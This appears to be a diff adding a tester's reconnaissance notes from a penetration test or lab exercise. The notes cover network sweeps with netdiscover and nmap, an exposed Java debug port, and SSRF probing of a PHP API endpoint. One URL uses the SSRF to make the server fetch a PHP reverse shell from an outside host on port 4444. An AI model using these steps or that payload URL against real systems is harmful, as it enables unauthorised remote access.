@@ -1,0 +1,33 @@
+ssh port 22 on 172.16.116.17
+
+netdiscover on 10.0.0.0/8
+10.0.6.1        20:9a:7d:cf:22:f8      1      60  Sagemcom Broadband SAS
+10.1.0.2        20:9a:7d:cf:22:f8      1      60  Sagemcom Broadband SAS
+
+5d4fa8c2e3ed0cade110820998e83bb5d671e5f61ae8a8eb658931eedd217028
+afec73a4565304a3b4b1cd7edf134ebff3674d98516b58077f938feb80c041d3
+
+nmap -sn 10.0.0.0/8 -v
+
+10.46.128.71
+22/tcp    open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
+18001/tcp open  jdwp    Java Debug Wire Protocol (Reference Implementation) version 11.0 11.0.11
+-> https://www.redteamsecure.com/research/exploitation-java-debug-wire-protocol
+-> no session on msf
+=> https://book.hacktricks.xyz/pentesting/pentesting-jdwp-java-debug-wire-protocol
+=> nothing too...
+
+10.46.128.70
+- 22/tcp   open  ssh
+- 8100/tcp open  xprint-server
+
+maybe 10.0.42.100
+
+http://10.46.128.70:8100/
+http://10.46.128.70:8100/api/call_api.php?api=10.0.42.100/api/
+http://10.46.128.70:8100/api/call_api.php?api=10.0.42.100@google.com
+
+http://10.46.128.70:8100/api/call_api.php?api=10.0.42.100@172.16.116.19:4444/php-reverse-shell.php
+-> executed from my side -> does not work
+
+10.44.46.67
